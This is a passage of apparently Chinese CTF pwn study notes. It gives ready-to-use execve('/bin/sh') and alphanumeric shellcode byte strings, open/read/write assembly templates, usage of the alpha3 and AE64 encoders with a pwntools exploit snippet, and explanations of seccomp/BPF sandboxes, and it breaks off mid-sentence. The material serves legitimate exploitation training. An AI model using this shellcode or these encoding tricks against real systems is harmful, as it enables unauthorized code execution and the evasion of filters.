    <content type="html"><![CDATA[<h1 id="任务Ⅰ—-shellcode相关"><a href="#任务Ⅰ—-shellcode相关" class="headerlink" title="任务Ⅰ—-shellcode相关"></a>任务Ⅰ—-shellcode相关</h1><h2 id="shellcode-getshell"><a href="#shellcode-getshell" class="headerlink" title="shellcode(getshell)"></a>shellcode(getshell)</h2><h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><p><strong>22字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\xB0\x3B\x99\x0F\x05</span><br></pre></td></tr></table></figure><p><strong>23字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><br></pre></td></tr></table></figure><p><strong>53字节,pwntools:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x68\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x2F\x73\x50\x48\x89\xE7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xF6\x56\x6A\x08\x5E\x48\x01\xE6\x56\x48\x89\xE6\x31\xD2\xFF\x34\x25\x00\x00\x00\x00\x58\x0F\x05</span><br></pre></td></tr></table></figure><p><strong>纯ascii大小写字母加数字表示的shellcode:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><p><strong>18字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x0B\x58\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80</span><br></pre></td></tr></table></figure><p><strong>21字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure><p><strong>48字节,pwntools:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x68\x68\x2F\x2F\x2F\x73\x68\x2F\x62\x69\x6E\x89\xE3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xC9\x51\x6A\x04\x59\x01\xE1\x51\x89\xE1\x31\xD2\xFF\x35\x00\x00\x00\x00\x58\xCD\x80</span><br></pre></td></tr></table></figure><p><strong>纯ascii大小写字母加数字表示的shellcode:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br></pre></td></tr></table></figure><h2 id="shellcode-orw"><a href="#shellcode-orw" class="headerlink" title="shellcode(orw)"></a>shellcode(orw)</h2><h3 id="i386-1"><a href="#i386-1" class="headerlink" title="i386"></a>i386</h3><p>采用int 0x80系统中断达到系统调用</p><p>eax存放系统调用号并在调用结束存储返回值,ebx,ecx,edx,esi,edi依次为参数,与函数调用约定存放在栈中不同</p><h4 id="open-返回文件流序号fd"><a href="#open-返回文件流序号fd" class="headerlink" title="open(返回文件流序号fd)"></a>open(返回文件流序号fd)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">push ecx    ;文件名结束&#x27;\x00&#x27;</span><br><span class="line">push 文件名ascii-&gt;小端序数据</span><br><span class="line">mov ebx,esp ;文件名在栈中</span><br><span class="line">xor edx,edx ;int mode</span><br><span class="line">mov eax,5   ;sys_open</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax   ;上一步返回的fd存储在eax</span><br><span class="line">mov ecx,esp   ;写在何处,一般直接在栈上,也可以在别处</span><br><span class="line">mov edx,0x??  ;大小</span><br><span class="line">mov eax,3     ;sys_read</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,1     ;mov ebx,2也行</span><br><span class="line">/*0标准输入,1标准输出,2标准错误*/</span><br><span class="line">mov edx,0x??  ;大小</span><br><span class="line">mov eax,4     ;sys_write</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h3 id="amd64-1"><a href="#amd64-1" class="headerlink" title="amd64"></a>amd64</h3><p>与i386大同小异</p><p>采用syscall系统调用</p><p>rax存放系统调用号并在调用结束存储返回值,rdi,rsi,rdx,rcx,r8,r9依次为参数,与函数调用约定一致</p><h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">push rdx   ;文件名结束&#x27;\x00&#x27;,也可以添加在文件名其实</span><br><span class="line">push 文件名ascii-&gt;小端序数据</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,2   ;直接mov rax,2要更长</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h4 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov dl,0x??</span><br><span class="line">mov al,0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h4 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line">mov edi,1</span><br><span class="line">mov al,1;</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="纯可见字符shellcode"><a href="#纯可见字符shellcode" class="headerlink" title="纯可见字符shellcode"></a>纯可见字符shellcode</h2><p>相关资料</p><p><a href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode</a></p><p><a href="https://web.archive.org/web/20110716082815/http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes">x86纯字符编码表</a></p><p><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes">x64纯字符编码表</a></p><h3 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h3><p>其是一个python2的脚本</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法:"></a>使用方法:</h4><p>先生成shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line">print asm(sc)</span><br></pre></td></tr></table></figure><p>保存到aplha3目录下</p><p><code>python2 sc.py &gt; payload</code></p><p>生成纯可见字符alpha shellcode</p><p><code>python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;payload&quot;</code></p><p><strong>参数分析:</strong></p><ul><li>x64  选择位数[可选x86]</li><li>ascii mixedcase 选择字符表[可选ascii uppercase (数字+大写字母)   ascii lowercase (数字+小写字母)   ascii mixedcase (数字+大小写字母)]</li><li>rax 用于编码的寄存器(shellcode基址)  见下引例</li><li>—input=’’  输入文件</li></ul><p>比如有如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00101246 48 8d     LEA    RAX,[RBP + -0x410]</span><br><span class="line">         85 f0 </span><br><span class="line">         fb ff </span><br><span class="line">0010124d ff d0     CALL   RAX</span><br><span class="line">; ...</span><br></pre></td></tr></table></figure><p>通过call rax跳转到shellcode，那么alpha3命令中<strong>用于编码的寄存器就是rax</strong></p><p><strong>shellcode的起始地址存在哪个寄存器中，用于编码的寄存器就是哪个</strong></p><hr><p><strong>alpha3支持的所有编码方式如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Valid base address examples for each encoder, ordered by encoder settings,</span><br><span class="line">are:</span><br><span class="line"></span><br><span class="line">[x64 ascii mixedcase]</span><br><span class="line">  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI</span><br><span class="line"></span><br><span class="line">[x86 ascii lowercase]</span><br><span class="line">  AscLow 0x30 (rm32)        ECX EDX EBX</span><br><span class="line"></span><br><span class="line">[x86 ascii mixedcase]</span><br><span class="line">  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]</span><br><span class="line">                            ECX+2 ESI+4 ESI+8</span><br><span class="line">  AscMix 0x30 (i32)         (address)</span><br><span class="line">  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty</span><br><span class="line">                            countslide:EBX+offset~uncertainty</span><br><span class="line">                            countslide:ECX+offset~uncertainty</span><br><span class="line">                            countslide:EDX+offset~uncertainty</span><br><span class="line">                            countslide:ESI+offset~uncertainty</span><br><span class="line">                            countslide:EDI+offset~uncertainty</span><br><span class="line">  AscMix Countslide (i32)   countslide:address~uncertainty</span><br><span class="line">  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3</span><br><span class="line"></span><br><span class="line">[x86 ascii uppercase]</span><br><span class="line">  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]</span><br><span class="line"></span><br><span class="line">[x86 latin-1 mixedcase]</span><br><span class="line">  Latin1Mix CALL GetPC      call</span><br><span class="line"></span><br><span class="line">[x86 utf-16 uppercase]</span><br><span class="line">  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]</span><br></pre></td></tr></table></figure><h3 id="ae64"><a href="#ae64" class="headerlink" title="ae64"></a>ae64</h3><p><a href="https://github.com/veritas501/ae64">AE64</a>是杭电的一位大师傅写的python3脚本工具，专用于生成64位的aplha shellcode。</p><p>AE64的优势在于编码时可以更加灵活地使用寄存器，但是生成的alpha shellcode比alpha3要更长一些。</p><p>此外AE64是python写的，可以直接在python中调用，以下是官方的栗子：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./example1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()),<span class="string">&#x27;r13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="任务Ⅱ—-sandbox学习"><a href="#任务Ⅱ—-sandbox学习" class="headerlink" title="任务Ⅱ—-sandbox学习"></a>任务Ⅱ—-sandbox学习</h1><p>ctf中一般使用seccomp有两种方法，一种是用<strong>prctl</strong>，另一种是用<strong>seccomp</strong></p><p>其一般都会禁用execve函数，使之无法直接getshell</p><h2 id="BPF"><a href="#BPF" class="headerlink" title="BPF"></a>BPF</h2><p>BPF即伯克利包过滤器(Berkeley Packets Filter)</p><p>BPF 定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器，和赋值、算术、跳转指令。一条指令由一个定义好的结构 struct bpf_insn 表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p><p>总结起来就下面的一些点：</p><ol><li><strong>结构赋值操作指令为</strong>：BPF_STMT、BPF_JUMP</li><li><strong>BPF 的主要指令有</strong> BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令</li><li><strong>BPF 条件判断跳转指令</strong>：BPF_JMP、BPF_JEQ，根据后面的几个参数进行判断，然后跳转到相应的地方。</li><li><strong>返回指令</strong>：BPF_RET、BPF_K，返回后面参数的值</li></ol><p>其可以用于沙箱的的实现</p><p><strong>例如</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="number">0</span>),          <span class="comment">// 从第0个字节位置开始，加载读取系统调用号</span></span><br><span class="line">    BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="number">257</span>, <span class="number">1</span>, <span class="number">0</span>),       <span class="comment">// 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行</span></span><br><span class="line">    BPF_JUMP(BPF_JMP|BPF_JGE, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),         <span class="comment">// 比较系统调用号是否大于 0，是就跳到第6行</span></span><br><span class="line">    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), <span class="comment">// 拒绝系统调用，返回 0</span></span><br><span class="line">    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), <span class="comment">// 允许系统调用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="prctl函数实现"><a href="#prctl函数实现" class="headerlink" title="prctl函数实现"></a>prctl函数实现</h2><p>这个函数可以对进程就行操作，<strong>第一个参数可以指定你想做的事</strong>，因此第一个参数的可选项非常多。</p><p>第一个参数常见的为<code>38(PR_SET_NO_NEW_PRIVS)</code>和<code>22(PR_SET_SECCOMP)</code>两种情况</p><h3 id="38-PR-SET-NO-NEW-PRIVS"><a href="#38-PR-SET-NO-NEW-PRIVS" class="headerlink" title="38(PR_SET_NO_NEW_PRIVS)"></a>38(PR_SET_NO_NEW_PRIVS)</h3><p>简单的说就是如果 option 设置为 <code>PR_SET_NO_NEW_PRIVS</code> 的话，第二个参数如果设置为 1 的话，<strong>不能够进行 execve 的系统调用，同时这个选项还会继承给子进程</strong>。</p><p><strong>只能进行几个系统调用：open、write、read</strong>。</p><h3 id="22-PR-SET-SECCOMP"><a href="#22-PR-SET-SECCOMP" class="headerlink" title="22(PR_SET_SECCOMP)"></a>22(PR_SET_SECCOMP)</h3><ul><li>第二个参数为1时，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</li><li>第二个参数为2时，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则</li></ul><h2 id="seccomp实现"><a href="#seccomp实现" class="headerlink" title="seccomp实现"></a>seccomp实现</h2><p>一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);    </span><br><span class="line">&#125;</span><br><span class="line">seccomp_init \\</span><br><span class="line">scmp_filter_ctx <span class="title function_">seccomp_init</span><span class="params">(<span class="type">uint32_t</span> def_action)</span>;</span><br><span class="line">initialize the internal seccomp filter state, prepares it <span class="keyword">for</span> use, and sets the <span class="keyword">default</span> action based on the def_action parameter</span><br></pre></td></tr></table></figure><p>seccomp_init 返回的是一个 scmp_filter_ctx 的结构体</p><p>有效的 def_action 有下面几种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SCMP_ACT_KILL</span><br><span class="line">SCMP_ACT_KILL_PROCESS</span><br><span class="line">SCMP_ACT_TRAP</span><br><span class="line">SCMP_ACT_ERRNO</span><br><span class="line">SCMP_ACT_TRACE</span><br><span class="line">SCMP_ACT_LOG</span><br><span class="line">SCMP_ACT_ALLOW</span><br></pre></td></tr></table></figure><p>其中<code>SCMP_ACT_KILL</code> 和 <code>SCMP_ACT_ALLOW</code>，一个是白名单，一个是黑名单</p><p><code>seccomp_rule_add</code>可以添加规则</p><p><code>int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action,int syscall, unsigned int arg_cnt, ...);</code></p><p>arg_cnt 这个是指后面跟随的参数的个数，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">3</span>,</span><br><span class="line">                      SCMP_A0(SCMP_CMP_EQ, fd),</span><br><span class="line">                      SCMP_A1(SCMP_CMP_EQ, (<span class="type">scmp_datum_t</span>)buf),</span><br><span class="line">                      SCMP_A2(SCMP_CMP_LE, BUF_SIZE));</span><br><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">1</span>,</span><br><span class="line">                      SCMP_CMP(<span class="number">0</span>, SCMP_CMP_EQ, fd));</span><br><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>分别是 3 ，1，0 个。然后后面的参数就是 comparison op,主要有下面几种</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SCMP_CMP_NE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> <span class="built_in">not</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_NE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_LT</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> less than the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_LT , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_LE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> less than <span class="built_in">or</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_LE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_EQ</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_EQ , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_GE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> greater than <span class="built_in">or</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_GE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_GT</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> greater than the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_GT , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_MASKED_EQ</span><br><span class="line">Matches <span class="keyword">when</span> the masked argument value <span class="built_in">is</span> equal <span class="keyword">to</span> the masked datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_MASKED_EQ , mask , datum )</span><br></pre></td></tr></table></figure><p>seccomp_load 其实就是应用 filter</p><h2 id="CTF中常见的seccomp"><a href="#CTF中常见的seccomp" class="headerlink" title="CTF中常见的seccomp"></a>CTF中常见的seccomp</h2><h3 id="1—禁用execve"><a href="#1—禁用execve" class="headerlink" title="1—禁用execve"></a>1—禁用execve</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0000:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">arch</span></span><br><span class="line"><span class="attr">0001:</span> <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0xc000003e</span>  <span class="string">if</span> <span class="string">(A</span> <span class="type">!=</span> <span class="string">ARCH_X86_64)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0002:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">sys_number</span></span><br><span class="line"><span class="attr">0003:</span> <span class="number">0x35</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">&gt;=</span> <span class="number">0x40000000</span><span class="string">)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0004:</span> <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">==</span> <span class="string">execve)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0005:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="string">return</span> <span class="string">ALLOW</span></span><br><span class="line"><span class="attr">0006:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">return</span> <span class="string">KILL</span></span><br></pre></td></tr></table></figure><p>这种可以通过 open read write 来读取flag</p><h3 id="2—禁用execve-open-write-read"><a href="#2—禁用execve-open-write-read" class="headerlink" title="2—禁用execve,open,write,read"></a>2—禁用execve,open,write,read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>open系统调用实际上是调用了openat，所以直接 